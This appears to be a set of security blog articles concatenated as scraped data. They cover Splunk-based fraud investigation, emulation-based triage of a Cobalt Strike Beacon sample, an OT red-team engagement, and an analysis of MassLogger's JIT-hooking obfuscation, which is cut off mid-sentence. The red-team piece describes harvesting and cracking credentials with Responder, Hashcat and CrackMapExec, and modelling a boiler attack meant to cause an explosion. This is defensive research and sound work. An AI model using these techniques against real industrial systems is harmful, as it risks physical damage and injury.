6. Figure 6: Bank accounts added and assigned to a provider By clicking on the organization ID in the Splunk results table, the DFUR analyst triggered a drill-down action to automatically open the Organization Enrichment Dashboard and populate the organization ID value with the results from the previous panel (Figure 7). The DFUR analyst determined that the bank routing information for the new bank accounts was inconsistent with the organization’s mailing address. Figure 7: Organization Enrichment Dashboard The activity indicated that the attacker had access to the user’s primary email and successfully reset the DFUR account password. The DFUR analyst confirmed that no other accounts were targeted by the suspicious IP address (Figure 8). Figure 8: IP Address Enrichment dashboard Attack Scenario #2: Credential Stuffing Later that afternoon, the DFUR team began receiving reports of account lockouts in the patient and provider portals when users tried to login. The security team was asked to investigate potential password attack activity on their DFUR platform. The DFUR analyst pulled up the main monitoring and detection dashboard and scrolled down to the panel focused on identifying potential password attack activity (Figure 9). They identified five (5) IP addresses associated with an elevated number of failed login attempts, suggesting a password spray or credential stuffing attack with varying success. Figure 9: Dashboard panel showing potential password attack events The DFUR analyst clicked on one of the IP addresses which triggered a drill-down action to open the IP Address Enrichment dashboard and prepopulate the IP address token value (Figure 10). Figure 10: IP Address Enrichment dashboard The DFUR analyst identified more than 3,000 failed login attempts associated with the IP address with three (3) successful logins that morning. The Remote Access Analytics panels for the IP address further showed successful logins for accounts that may have been successfully compromised and need to be reset (Figure 11). Figure 11: Remote access analytics for IP address Conclusion After implementing the newly developed logs and analysis capabilities and by leveraging Splunk’s security solutions, the DFUR security team drastically improved key metrics aligned with their application security missions: Identify compromise and fraud before customers report it Analyze 90% of application security events within 30 minutes Answer all investigation questions from users, compliance, and legal teams Mandiant and the whole DFUR security team hope you can use the scenarios and references in this post to improve your log analysis and how you leverage a SIEM solution in the following ways: Reflect on your current logging gaps and capabilities to improve Enhance logs from “whatever the developers implemented” to “designed to be investigated” Develop investigative workflows that are reliable and repeatable Correlate pivot points between your data sources and streamline correlation capabilities Create monitoring and alerting capabilities based on threat modeling Lower the technical barrier for comprehensive analysis Implement similar analysis capabilities to those in the “DFUR” Splunk application, linked in the References section Understand that logs can lead into better security analytics and strengthening of your security operations References For organizations that utilize Splunk security solutions as their SIEM solution, for automation, analytics or log aggregation, or want to try out for free with Splunk’s free trial download, we developed an application called “Dog and Feline Urgent Response (DFUR)” to demonstrate application log forensic analysis and dashboard pivoting concepts. The code contains pre-indexed data and CSV files referenced by searches contained in four Splunk XML dashboards. All data, such as IP addresses and usernames, was fabricated for the purposes of the demo and any association with organizations, users, or pets is coincidental.

                "text": "In order to enable emulation of malware samples at scale, we have developed the Speakeasy emulation framework . Speakeasy aims to make it as easy as possible for users who are not malware analysts to acquire triage reports in an automated way, as well as enabling reverse engineers to write custom plugins to triage difficult malware families. Originally created to emulate Windows kernel mode malware, Speakeasy now also supports user mode samples. The project’s main goal is high resolution emulation of the Windows operating system for dynamic malware analysis for the x86 and amd64 platforms. Similar emulation frameworks exist to emulate user mode binaries. Speakeasy attempts to differentiate from other emulation frameworks the following ways: Architected specifically around emulation of Windows malware Supports emulation of kernel mode binaries to analyze difficult to triage rootkits Emulation and API support driven by current malware trends to provide the community with a means to extract indicators of compromise with no extra tooling Completely configurable emulation environment requiring no additional code The project currently supports kernel mode drivers, user mode Windows DLLs and executables, as well as shellcode. Malware samples can be automatically emulated, with reports generated for later post processing. The ongoing project goal will be continuing to add support for new or popular malware families. In this blog post, we will show an example of Speakeasy’s effectiveness at automatically extracting network indicators from a Cobalt Strike Beacon sample acquired from an online malware aggregate. Background Dynamic analysis of Windows malware has always been a crucial step during the malware analysis process. Understanding how malware interacts with the Windows API and extracting valuable host-based and network-based indicators of compromise (IOCs) are critical to assessing the impact malware has on an affected network. Typically, dynamic analysis is performed in an automated or targeted fashion. Malware can be queued to execute within a sandbox to monitor its functionality, or manually debugged to reveal code paths not executed during sandbox runs. Code emulation has been used historically for testing, validation and even malware analysis. Being able to emulate malicious code lends many benefits from both manual and automated analysis. Emulation of CPU instructions allows for total instrumentation of binary code where control flow can be influenced for maximum code coverage. While emulating, all functionality can be monitored and logged in order to quickly extract indicators of compromise or other useful intelligence. Emulation provides several advantages over execution within a hypervisor sandbox. A key advantage is noise reduction. While emulating, the only activity that can be recorded is either written by the malware author, or statically compiled within the binary. API hooking within a hypervisor (especially from a kernel mode perspective) can be difficult to attribute to the malware itself. For example, sandbox solutions will often hook heap allocator API calls without knowing if the malware author intended to allocate memory, or if a lower-level API was responsible for the memory allocation. However, emulation has disadvantages as well. Since we are removing the operating system from the analysis phase, we, as the emulator, are now responsible for providing the expected inputs and outputs from API calls and memory access that occur during emulation. This requires substantial effort in order to successfully emulate malware samples that are expected to the run on a legitimate Windows system. Shellcode as an Attack Platform In general, shellcode is an excellent choice for attackers to remain stealthy on an infected system. Shellcode runs within executable memory and does not need to be backed by any file on disk. This allows attacker code to hide easily within memory where most forms of traditional forensic analysis will fail to identify it. Either the original binary file that loads the shellcode must first be identified, or the shellcode itself must be dumped from memory. To avoid detection, shellcode can be hidden within a benign appearing loader, and then be injected into another user mode process. In the first part of this blog series, we will show the effectiveness of emulation with one of the more common samples of shellcode malware encountered during incident response investigations. Cobalt Strike is a commercial penetration testing framework that typically utilizes stagers to execute additional code. An example of a stager is one that downloads additional code via a HTTP request and executes the HTTP response data. The data in this case is shellcode that commonly begins with a decode loop, followed by a valid PE that contains code to reflectively load itself. In the case of Cobalt Strike, this means it can be executed from the start of the executable headers and will load itself into memory. Within the Cobalt Strike framework, the payload in this case is typically an implant known as Beacon. Beacon is designed to be a memory resident backdoor used to maintain command and control (C2) over an infected Windows system. It is built using the Cobalt Strike framework without any code modifications and can be easily built to have its core functionality and its command and control information modified. All of this allows attackers to rapidly build and deploy new variants of Beacon implants on compromised networks. Therefore, a tool to rapidly extract the variable components of Beacon are necessary and, ideally, will not require the valuable time of malware analysts. Speakeasy Design Speakeasy currently employs the QEMU-based emulator engine Unicorn to emulate CPU instructions for the x86 and amd64 architectures. Speakeasy is designed to support arbitrary emulation engines in the future via an abstraction layer, but it currently relies on Unicorn. Full OS sandboxing will likely always be required to analyze all samples as generically emulating all of Windows is somewhat unfeasible. Sandboxing can be difficult to scale on demand and can be time consuming to run samples. However, by making sure we emulate specific malware families, such as Beacon in this example, we can quickly reduce the need to reverse engineer variants. Being able to generate high level triage reports in an automated fashion is often all the analysis that is needed on a malware variant. This allows malware analysts more time to focus on samples that may require deeper analysis. Shellcode or Windows PEs are loaded into the emulated address space. Windows data structures required to facilitate basic emulation of Windows kernel mode and user mode are created before attempting to emulate the malware. Processes, drivers, devices and user mode libraries are “faked” in order to present the malware with a realistic looking execution environment. Malware will be able to interact with an emulated file system, network and registry. All these emulated subsystems can be configured with a configuration file supplied to each emulation run. Windows APIs are handled by Python API handlers. These handlers will try to emulate expected outputs from these APIs so that malware samples will continue their expected execution path. When defining an API handler, all that is needed is the name of the API, the number of arguments the API expects, and an optional calling convention specification. If no calling convention is supplied, stdcall is assumed. Currently, if an API call is attempted that is not supported, Speakeasy will log the unsupported API and move on to the next entry point. An example handler for the Windows HeapAlloc function exported by kernel32.dll is shown in Figure 1. Figure 1: Example handler for Windows HeapAlloc function All entry points are emulated by default. For example, for DLLs, all exports are emulated, and for drivers, the IRP major functions are each emulated. In addition, dynamic entry points that are discovered during runtime are followed. Some examples of dynamic entry points include threads that are created or callbacks that are registered. Attributing activity to specific entry points can be crucial to seeing the whole picture when trying to identify the impact of a malware infection. Reporting Currently, all events captured by the emulator are logged and represented by a JSON report for easy post processing. This report contains events of interest that are logged during emulation. Like most emulators, all Windows API calls are logged along with arguments. All entry points are emulated and tagged with their corresponding API listings. In addition to API tracing, other specific events are called out including file, registry and network access. All decoded or “memory resident” strings are dumped and displayed in the report to revealed useful information not found within static string analysis. Figure 2 shows an example of a file read event logged in a Speakeasy JSON report. Figure 2: File read event in a Speakeasy report Speed Because the framework is written in Python, speed is an obvious concern. Unicorn and QEMU are written in C, which provides very fast emulation speeds; however, the API and event handlers we write are in Python. Transitioning between native code and Python is extremely expensive and should be done as little as possible. Therefore, the goal is to only execute Python code when it is absolutely necessary. By default, the only events we handle in Python are memory access exceptions or Windows API calls. In order to catch Windows API calls and emulate them in Python, import tables are doped with invalid memory addresses so that we only switch into Python when import tables are accessed. Similar techniques are used for when shellcode accesses the export tables of DLLs loaded within the emulated address space of the malware. By executing as little Python code as possible, we can maintain reasonable speeds while still allowing users to rapidly develop capabilities for the framework. Memory Management Speakeasy implements a lightweight memory manager on top of the emulator engine’s memory management. Each chunk of memory allocated by malware is tracked and tagged so that meaningful memory dumps can be acquired. Being able to attribute activity to specific chunks of memory can prove to be extremely useful for analysts. Logging memory reads and writes to sensitive data structures can reveal the true intent of malware not revealed by API call logging, which is particularly useful for samples such as rootkits. Speakeasy offers an optional “memory tracing” feature that will log all memory accesses that samples exhibit. This will log all reads, writes and executes to memory. Since the emulator tags all allocated memory chunks, it is possible to glean much more context from this data. If malware hooks a critical data structure or pivots execution to dynamically mapped memory this will be revealed and can be useful for debugging or attribution. This feature comes at a great speed cost, however, and is not enabled by default. The emulated environment presented to malware includes common data structures that shellcode uses to locate and execute exported Windows system functions. It is necessary to resolve exported functions in order to invoke the Win32 API and therefore have meaningful impact on a targeted system. In most cases, Beacon included, these functions are located by walking the process environment block (commonly called the PEB). From the PEB, shellcode can access a list of all loaded modules within a process’s virtual address space. Figure 3 shows a memory report generated from emulating a Beacon shellcode sample. Here we can trace the malware walking the PEB in order to find the address of kernel32.dll. The malware then manually resolves and calls the function pointer for the “VirtualAlloc” API, and proceeds to decode and copy itself into the new buffer to pivot execution. Figure 3: Memory trace report Configuration Speakeasy is highly configurable and allows users to create their own “execution profiles”. Different levels of analysis can be specified in order to optimize individual use cases. The end goal is allowing users easy switching of configuration options with no code changes. Configuration profiles are currently structured as JSON files. If no profile is provided by the user, a default configuration is provided by the framework. The individual fields are documented within the Speakeasy project. Figure 4 shows a snippet of the network emulator configuration subsection. Here, users can specify what IP addresses get returned when a DNS lookup occurs, or in the case of some Beacon samples, what binary data gets returned during a TXT record query. HTTP responses have custom responses configured as well. Figure 4: Network configuration Many HTTP stagers will retrieve a web resource using a HTTP GET request. Often, such as with Cobalt Strike or Metasploit stagers, this buffer is then immediately executed so the next stage of execution can begin. This response can be easily configured with Speakeasy configurations. In the configuration in Figure 4, unless overridden, the framework will supply the data contained in the referenced default.bin file. This file currently contains debug interrupt instructions (int3), so if the malware attempts to execute the data it exits and will be logged in the report. Using this, we can easily label the malware as a downloader that downloads additional code. Configuration fields also exist for file system and registry emulation. Files and registry paths can similarly be configured to return data to samples that expect to be running on a live Windows system. Limitations As said, emulation comes with some challenges. Maintaining feature parity with the system being emulated is an ongoing battle; however, it provides unique opportunities for controlling the malware and greater introspection options. In cases where emulation does not complete fully, emulation reports and memory dumps can still be generated in order to gather as much data as possible. For example, a backdoor may successfully install its persistence mechanism, but fail to connect to its C2 server. In this situation, the valuable host-based indicators are still logged and can provide value to an analyst. Missing API handlers can quickly and easily be added to the emulator in order to handle these situations. For many API handlers, simply returning a success code will be sufficient to make the malware to continue execution. While full emulation of every piece of malware may not be feasible, targeting functionality of specific malware families can greatly reduce the need to reverse engineer variants of the same families. Usage Speakeasy is available right now on our GitHub . It can be installed with the included Python installer script or installed within a Docker container using the provided Dockerfile. It is platform agnostic and can be used to emulate Windows malware on Windows, Linux or MacOS. More information can be found on the project’s README . Once installed, Speakeasy can be used as a standalone library or invoked directly using the provided run_speakeasy.py script. In this blog post we will demonstrate how to emulate a malware sample directly from the command line. For information on how to use Speakeasy as a library, see the project’s README . The included script is meant to emulate a single sample and generate a JSON report with the logged events. The command line arguments for run_speakeasy.py are shown in Figure 5. Figure 5: Command line arguments for run_speakeasy.py Speakeasy also offers a rich development and hooking interface for writing custom plugins. This will be covered in more detail in a later blog post. Emulation of a Beacon Implant For this example, we will be emulating shellcode that decodes and executes a Beacon implant variant that has a SHA-256 hash of 7f6ce8a8c2093eaf6fea1b6f1ef68a957c1a06166d20023ee5b637b5f7838918. We begin by verifying the file format of the sample. This sample is expected to be launched either by a loader or used as part of an exploit payload. Figure 6: Hex dump of malware sample In Figure 6, we can clearly see that the file is not in the PE file format. An analyst who has seen many shellcode samples may notice the first two bytes: “0xfc 0xe8”. These bytes disassemble to the intel assembly instructions “cld” and “call”. The “cld” instruction is a common prelude to position independent shellcode as it will clear the direction flag allowing malware to easily parse string data from system DLL’s export tables. The following call instruction is often used by shellcode to get its current program counter by following it with a “pop” instruction. This allows the malware to discover where it is executing from in memory. Since we are reasonably certain this sample is shellcode, we will invoke Speakeasy with the command line shown in Figure 7. Figure 7: Command line used to emulate malware sample This will instruct Speakeasy to emulate the sample from offset zero as x86 shellcode. Note: even though we are emulating code and not actually executing it, these are still attacker generated binaries. It may still be wise to emulate malicious code within a virtual machine in the event a vulnerability is discovered in whatever native CPU emulation engine is used. After emulation, a report will be generated named “report.json”. In addition, a full memory dump of the emulation environment will be compressed and written to “memory_dump.zip”. The malware will get loaded into emulated memory inside of a fake container process to simulate a real execution environment that shellcode would expect to be running in. Once emulation begins, emulated API calls will be logged to the screen along with their arguments and return values. Figure 8 shows the Beacon sample allocating a new memory buffer where it will copy itself. The malware then begins to manually resolve exports it needs to execute. Figure 8: Network configuration After additional decoding and setup, the malware attempts to connect to its C2 server. In Figure 9, we can see the malware using the Wininet library to connect and read data from the C2 server using HTTP. Figure 9: Wininet API calls to connect to C2 The malware will loop endlessly until it receives the data it expects from its C2 server. Speakeasy will timeout after a predetermined amount of time and generate a JSON report. Figure 10: Network C2 events The network indicators are summarized in the “network_events” and “traffic” sections of the generated report. In Figure 10, we can see the IP address, port number and, in this case, HTTP headers associated with the connections made by the malware. In this example, when we emulated the sample, we instructed Speakeasy to create a memory dump of the emulated address space. A ZIP archive will get created of each memory allocation along with context around it. This context includes base address, size and a tag that is assigned by the emulator in order to identify what the memory allocation corresponds to. Figure 11 shows a snippet of the memory dump files created during emulation. The file names contain the tag and base address associated with each memory allocation. Figure 11: Individual memory blocks acquired from emulation If we just run strings on these memory dumps, we can quickly locate interesting strings along with the Beacon configuration data, which is shown in Figure 12. Figure 12: Configuration string data for the malware In a triage level of analysis, we may only care about the indicators of compromise for a malware variant of a known family. However, if full reverse engineering of the sample is required, we can also recover the decoded version of the Beacon malware in its DLL form. By simply doing a primitive grep for the “MZ” magic bytes, we find the only hits are the memory dumps related to the original sample’s allocation and the virtual allocated buffer that the malware copies itself to (Figure 13). Figure 13: Memory dump containing the decoded malware If we look at the bytes in the original shellcode buffer, we can see that it was decoded before it was copied and is sitting in memory ready to be dumped at offset 0x48. We can now successfully load the decoded Beacon DLL into IDA Pro for full analysis (Figure 14). Figure 14: Decoded malware successfully loaded into IDA Pro Conclusion In this blog post we demonstrated how the Speakeasy emulation framework can be used to automatically triage a Beacon malware sample. We used it to discover valuable network indicators, extract its config information from memory, and acquire a decoded Beacon DLL for further analysis. Head over to our GitHub to start using Speakeasy today , and stay tuned for the next blog post where we will demonstrate kernel malware analysis using emulation.

                "text": "Operational technology (OT) asset owners have historically considered red teaming of OT and industrial control system (ICS) networks to be too risky due to the potential for disruptions or adverse impact to production systems. While this mindset has remained largely unchanged for years, Mandiant's experience in the field suggests that these perspectives are changing; we are increasingly delivering value to customers by safely red teaming their OT production networks. This increasing willingness to red team OT is likely driven by a couple of factors, including the growing number and visibility of threats to OT systems, the increasing adoption of IT hardware and software into OT networks, and the maturing of OT security teams. In this context, we deemed it relevant to share some details on Mandiant's approach to red teaming in OT based on years of experience supporting customers learning about tangible threats in their production environments. In this post we introduce Mandiant's approach to OT red teaming and walk through a case study. During that engagement, it took Mandiant only six hours to gain administrative control on the target's OLE for Process Control (OPC) servers and clients in the target's Distributed Control System (DCS) environment. We then used this access to collect information and develop an attack scenario simulating the path a threat actor could take to prepare for and attack the physical process (We highlight that the red team did not rely on weaknesses of the DCS, but instead weak password implementations in the target environment). NOTE: Red teaming in OT production systems requires planning, preparation and \"across the aisle\" collaboration. The red team must have deep knowledge of industrial process control and the equipment, software, and systems used to achieve it. The red team and the asset owner must establish acceptable thresholds before performing any activities. Visit our website for more information or to request Mandiant services or threat intelligence . Mandiant's Approach for Safe Red Teaming in OT Mandiant's approach to red teaming OT production systems consists of two phases: active testing on IT and/or OT intermediary systems, and custom attack modeling to develop one or more realistic attack scenarios. Our approach is designed to mirror the OT-targeted attack lifecycle—with active testing during initial stages (Initial Compromise, Establish Foothold, Escalate Privileges, and Internal Reconnaissance), and a combination of active/passive data collection and custom threat modeling to design feasible paths an attacker would follow to complete the mission. Figure 1: Mandiant OT red teaming approach Mandiant's OT red teaming may begin either from the perspective of an external attacker leveraging IT compromises to pivot into the OT network, or from the perspective of an actor who has already gained access into the OT network and is ready to escalate the intrusion. We then leverage a range of commodity tools and utilities that are widely available in most target environments to pivot across OT intermediary systems and gain privileged access to target ICS. Throughout this process, we maintain constant communication with the customer to establish safety thresholds. Active participation from the defenders will also enable the organization to learn about the techniques we use to extract information and the weaknesses we exploit to move across the target network. Once the active testing stops at the agreed safety threshold, we compile this information and perform additional research on the system and processes to develop realistic and target-specific attack scenarios based on our expertise of threat actor behaviors. Mandiant's OT red teaming can be scoped in different ways depending on the target environment, the organization's goals, and the asset owner's cyber security program maturity. For example, some organizations may test the full network architecture, while others prefer to sample only an attack on a single system or process. This type of sampling is useful for organizations that own a large number of processes and are unlikely to test them one by one, but instead they can learn from a single-use case that reflects target-specific weaknesses and vulnerabilities. Depending on the scope, the red teaming results can be tailored to: Model attack scenarios based on target-specific vulnerabilities and determine the scope and consequences if a threat actor were to exploit them in their environment. Model attack paths across the early stages of reconnaissance and lateral movement to identify low-hanging fruit that adversaries may exploit to enable further compromise of OT. Operationalize threat intelligence to model scenarios based on tactics, techniques, and procedures (TTPs) from known actors, such as advanced persistent threats (APTs). Test specific processes or systems deemed at high risk of causing a disruption to safety or operations. This analysis highlights gaps or weaknesses to determine methods needed to secure high-risk system(s). Red Teaming in OT Provides Unique Value to Defenders Red teaming in OT can be uniquely helpful for defenders, as it generates value in a way very specific to an organizations' needs, while decreasing the gap between the \"no holds barred\" world of real attackers and the \"safety first\" responsibility of the red team. While it is common for traditional red teaming engagements to end shortly after the attacker pivots into a production OT segment, a hybrid approach, such as the one we use, makes it possible for defenders to gain visibility into the specific strengths and weaknesses of their OT networks and security implementations. Here are some other benefits of red teaming in OT production networks: It helps defenders understand and foresee possible paths that sophisticated actors may follow to reach specific goals. While cyber threat intelligence is another great way to build this knowledge, red teaming allows for additional acquisition of site-specific data. It responds to the needs of defenders to account for varying technologies and architectures present in OT networks across different industries and processes. As a result, it accounts for outliers that are often not covered by general security best practices guidance. It results in tangible and realistic outputs based on our active testing showing what can really happen in the target network. Mandiant's OT red teaming results often show that common security testing tools are sufficient for actors to reach critical process networks. It results in conceptual attack scenarios based on real attacker behaviors and specific knowledge about the target. While the scenarios may sometimes highlight weaknesses or vulnerabilities that cannot be patched, these provide defenders with the knowledge needed to define alternative mitigations to mitigate risks earlier in the lifecycle. It can help to identify real weaknesses that could be exploited by an actor at different stages of the attack lifecycle. With this knowledge, defenders can define ways to stop threat activity before it reaches critical production systems, or at least during early phases of the intrusion. Applying Our Approach in the Real World: Big Steam Works During this engagement, we were tasked with gaining access to critical control systems and designing a destructive attack in an environment where industrial steaming boilers are operated with an Distributed Control System (DCS). In this description, we redacted customer information—including the name, which we refer to as \"Big Steam Works\"—and altered sensitive details. However, the overall attack techniques remain unchanged. The main objective of Big Steam Works is to deliver steam to a nearby chemical production company. For the scope of this red team, the customer wanted to focus entirely on its OT production network. We did not perform any tests in IT networks and instead begun the engagement with initial access granted in the form of a static IP address in Big Steam Work's OT network. The goal of the engagement was to deliver consequence-driven analysis exploring a scenario that could cause a significant physical impact to both safety and operations. Following our red teaming approach, the engagement was divided in two phases: active testing across IT and/or OT intermediary systems, and custom attack modeling to foresee paths an attacker may follow to complete its mission. We note that during the active testing phase we were very careful to maintain high safety standards. This required not only highly skilled personnel with knowledge about both IT and OT, but also constant engagement with the customer. Members from Big Steam Works helped us to set safety thresholds to stop and evaluate results before moving forward, and actively monitored the test to observe, learn, and remain vigilant for any unintended changes in the process. Phase 1 – Active Testing During this phase, we leveraged publicly accessible offensive security tools (including Wireshark, Responder, Hashcat, and CrackMapExec) to collect information, escalate privileges, and move across the OT network. In close to six hours, we achieved administrative control on several Big Steam Works' OLE for Process Control (OPC) servers and clients in their DCS environment. We highlight that the test did not rely on weaknesses of the DCS, but instead weak password implementations in the target environment. Figure 2 details our attack path: Figure 2: Active testing in Big Steam Work's OT network We collected network traffic using Wireshark to map network communications and identify protocols we could use for credential harvesting, lateral movement, and privilege escalation. Passive analysis of the capture showed Dynamic Host Configuration Protocol (DHCP) broadcasts for IPv6 addresses, Link-Local Multicast Name Resolution (LLMNR) protocol traffic, and NetBios Name Service (NBT-NS) traffic. We responded to broadcast LLMNR, NBT-NS, and WPAD name resolution requests from devices using a publicly available tool called Responder. As we supplied our IP address in response to broadcasted name resolution requests from other clients on the subnet, we performed man-in-the-middle (MiTM) attacks and obtained NTLMv1/2 authentication protocol password hashes from devices on the network. We then used Hashcat to crack the hashed credentials and use them for further lateral movement and compromise. The credentials we obtained included, but were not limited to, service accounts with local administrator rights on OPC servers and clients. We note that Hashcat cracked the captured credentials in only six seconds due to the lack of password strength and complexity. With the credentials captured in the first three steps, we accessed other hosts on the network using CrackMapExec. We dumped additional cached usernames, passwords, and password hashes belonging to both local and domain accounts from these hosts. This resulted in privileged access and control over the DCS's OPC clients and servers in the network. While we did not continue to execute any further attack, the level of access gained at this point enabled us to perform further reconnaissance and data collection to design and conceptualize the last steps of a targeted attack on the industrial steaming boilers. The TTPs we used during the active testing phase resemble some of the simplest resources that can be used by threat actors during real OT intrusions. The case results are concerning given that they illustrate only a few of the most common weaknesses we often observe across Mandiant OT red team engagements. We highlight that all the tools used for this intrusion are known and publicly available. An attacker with access to Big Steam Works could have used these methods as they represent low-hanging fruit and can often be prevented with simple security mitigations. Phase 2 – Custom Attack Modeling For roughly a week, Mandiant gathered additional information from client documentation and research on industrial steaming boilers. We then mirrored the process an attacker would follow to design a destructive attack on the target process given the results achieved during phase 1. At this point of the intrusion, the attacker would have already obtained complete control over Big Steam Works' OPC clients and servers, gaining visibility and access to the DCS environment. Before defining the path to follow, the attacker would likely have to perform further reconnaissance (e.g., compromising additional systems, data, and credentials within the Big Steam Works DCS environment). Specifically, the attacker could: Gain access to the DCS configuration software/engineering workstation Obtain configuration/control logic files Determine the type/function of the different DCS nodes in the environment Use native DCS tools for system overview, graphics display, and point drill down Identify alarms/alerts monitored by operators via remote HMI screens and map them to defined points Map the flow of the physical process based on data collection and review Our next step was to develop the custom scenario. For this example, we were tasked with modeling a case where the attacker was attempting to create a condition that had a high likelihood of causing physical damage and disruption of operations (see Figure 3). In this scenario, the attacker attempted to achieve this by lowering the water level in a boiler drum below the safe threshold while not tripping the burner management system or other safety mechanisms. If successful, this would result in rapid and extreme overheating in the boiler. Opening the feedwater valve under such conditions could result in a catastrophic explosion. Figure 3: Custom attack model diagram for Big Steam Works Figure 3 describes how a real attacker might pursue their mission after gaining access to the OPC servers and clients. As the actor moves closer to their goals, it becomes more difficult to assess both the probability of success and the actual impact of their actions due to nuances specific to the client environment and additional safety and security controls built into the process. However, the analysis holds significant value as it illustrates the overall structure of the physical process and potential attacker behaviors aimed at achieving specific end goals. Furthermore, it proceeds directly from the results obtained during the first phase of the red teaming. The model presents one feasible combination of actions that an attacker could perform to access devices governing the boiler drum and modify the water level while remaining undetected. With the level of access obtained from phase 1, the attacker would likely be able to compromise engineering workstations (EWS) for the boiler drum's controller using similar tools. This would likely enable the actor to perform actions such as changing the drum level setpoints, modifying the flow of steam scaling, or modifying water flow scaling. While the model does not reflect all additional safety and security measures that may be present deeper in the process, it does account for the attacker's need to modify alarms and control sensor outputs to remain undetected. By connecting the outcomes produced in the test to the potential physical impacts and motivations involved in a real attack, this model provided Big Steam Works with a realistic overview of cyber security threats to a specific physical process. Further collaboration with the customer enabled us to validate the findings and support the organization to mitigate the risks reflected in the model. Outlook Mandiant's OT red teaming supports organizations by combining both the hands-on analysis of vulnerabilities and weaknesses in IT and OT networks with the conceptual modeling of attacker goals and possible avenues to reach specific outcomes. It also enables security practitioners to adopt the attacker's perspective and explore attack vectors that may otherwise have not been conceived regardless of their value as low-hanging fruit for OT intrusions. Our approach presents realistic scenarios based upon technical evidence of intrusion activity upon OT intermediary systems in the tested network. In this way, it is tailored to support consequence-driven analysis of threats to specific critical systems and processes. This enables organizations to identify attack scenarios involving digital assets and determine safeguards that can best help to protect the process and ensure the safety of their facilities.

                "text": "The FireEye Front Line Applied Research & Expertise (FLARE) Team attempts to always stay on top of the most current and emerging threats. As a member of the FLARE Reverse Engineer team, I recently received a request to analyze a fairly new credential stealer identified as MassLogger. Despite the lack of novel functionalities and features, this sample employs a sophisticated technique that replaces the Microsoft Intermediate Language (MSIL) at run time to hinder static analysis. At the time of this writing, there is only one publication discussing the MassLogger obfuscation technique in some detail. Therefore, I decided to share my research and tools to help analyze MassLogger and other malware using a similar technique . Let us take a deep technical dive into the MassLogger credential stealer and the .NET runtime. Triage MassLogger is a .NET credential stealer. It starts with a launcher ( 6b975fd7e3eb0d30b6dbe71b8004b06de6bba4d0870e165de4bde7ab82154871 ) that uses simple anti-debugging techniques which can be easily bypassed when identified. This first stage loader eventually XOR-decrypts the second stage assembly which then decrypts, loads and executes the final MassLogger payload ( bc07c3090befb5e94624ca4a49ee88b3265a3d1d288f79588be7bb356a0f9fae ) named Bin-123.exe . The final payload can be easily extracted and executed independently. Therefore, we will focus exclusively on this final payload where the main anti analysis technique is used. Basic static analysis doesn’t reveal anything too exciting. We notice some interesting strings, but they are not enough to give us any hints about the malware’s capabilities. Executing the payload in a controlled environment shows that the sample drops a log file that identifies the malware family, its version, and most importantly some configuration options. A sample log file is described in Figure 1. We can also extract some interesting strings from memory as the sample runs. However, basic dynamic analysis is not sufficient to extract all host-based indicators (HBIs), network-based indicators (NBIs) and complete malware functionality. We must perform a deeper analysis to better understand the sample and its capabilities.

We can use de4dot to automatically deobfuscate the MassLogger payload. However, looking at the deobfuscated payload, we quickly identify a major issue: Most of the methods contain almost no logic as shown in Figure 2. Figure 2: dnSpy showing empty methods Looking at the original MassLogger payload in dnSpy ’s Intermediate Language (IL) view confirms that most methods do not contain any logic and simply return nothing. This is obviously not the real malware since we already observed with dynamic analysis that the sample indeed performs malicious activities and logging to a log file. We are left with a few methods, most notably the method with the token 0x0600049D called first thing in the main module constructor. Figure 3: dnSpy IL view showing the method's details Method 0x0600049D control flow has been obfuscated into a series of switch statements. We can still somewhat follow the method’s high-level logic with the help of dnSpy as a debugger. However, fully analyzing the method would be very time consuming. Instead, when first analyzing this payload, I chose to quickly scan over the entire module to look for hints. Luckily, I spot a few interesting strings I missed during basic static analysis: clrjit.dll , VirtualAlloc , VirtualProtect and WriteProcessMemory as seen in Figure 4. Figure 4: Interesting strings scattered throughout the module A quick internet search for “ clrjit.dll ” and “ VirtualProtect ” quickly takes us to a few publications describing a technique commonly referred to as Just-In-Time Hooking. In essence, JIT Hooking involves installing a hook at the compileMethod() function where the JIT compiler is about to compile the MSIL into assembly (x86, x64, etc). With the hook in place, the malware can easily replace each method body with the real MSIL that contains the original malware logic. To fully understand this process, let’s explore the .NET executable, the .NET methods, and how MSIL turns into x86 or x64 assembly. .NET Executable Methods A .NET executable is just another binary following the Portable Executable (PE) format. There are plenty of resources describing the PE file format , the .NET metadata and the .NET token tables in detail. I recommend our readers to take a quick detour and refresh their memory on those topics before continuing. This post won’t go into further details but will focus on the .NET methods instead. Each .NET method in a .NET assembly is identified by a token. In fact, everything in a .NET assembly, whether it’s a module, a class, a method prototype, or a string, is identified by a token. Let’s look at method identified by the token 0x0600049D , as shown in Figure 5. The most-significant byte ( 0x06 ) tells us that this token is a method token (type 0x06 ) instead of a module token (type 0x00 ), a TypeDef token (type 0x02 ), or a LocalVarSig token (type 0x11 ), for example. The three least significant bytes tell us the ID of the method, in this case it’s 0x49D ( 1181 in decimal). This ID is also referred to as the Method ID (MID) or the Row ID of the method. Figure 5: Method details for method 0x0600049D To find out more information about this method, we look within the tables of the “ #~ ” stream of the .NET metadata streams in the .NET metadata directory as show in Figure 6. We traverse to the entry number 1181 or 0x49D of the Method table to find the method metadata which includes the Relative Virtual Address (RVA) of the method body, various flags, a pointer to the name of the method, a pointer to the method signature, and finally, an pointer to the parameters specification for this method. Please note that the MID starts at 1 instead of 0 . Figure 6: Method details from the PE file header For method 0x0600049D , the RVA of the method body is 0xB690 . This RVA belongs to the .text section whose RVA is 0x2000 . Therefore, this method body begins at 0x9690 ( 0xB690 – 0x2000 ) bytes into the .text section. The .text section starts at 0x200 bytes into the file according to the section header. As a result, we can find the method body at 0x9890 ( 0x9690 + 0x200 ) bytes offset into the file. We can see the method body in Figure 7. Figure 7: Method 0x0600049D body in a hex editor .NET Method Body The .NET method body starts with a method body header, followed by the MSIL bytes. There are two types of .NET methods: a tiny method and a fat method. Looking at the first byte of the method body header, the two least-significant bits tell us if the method is tiny (where the last two bits are 10 ) or fat (where the last two bits are 11 ). .NET Tiny Method Let’s look at method 0x06000495 . Following the same steps described earlier, we check the row number 0x495 ( 1173 in decimal) of the Method table to find the method body RVA is 0x7A7C which translates to 0x5C7C as the offset into the file. At this offset, the first byte of the method body is 0x0A ( 0000 1010 in binary). Figure 8: Method 0x06000495 metadata and body Since the two least-significant bits are 10 , we know that 0x06000495 is a tiny method. For a tiny method, the method body header is one byte long . The two least-significant bits are 10 to indicate that this is the tiny method, and the six most-significant bits tell us the size of the MSIL to follow (i.e. how long the MSIL is). In this case, the six most-significant bits are 000010 , which tells us the method body is two bytes long. The entire method body for 0x06000495 is 0A 16 2A , followed by a NULL byte, which has been 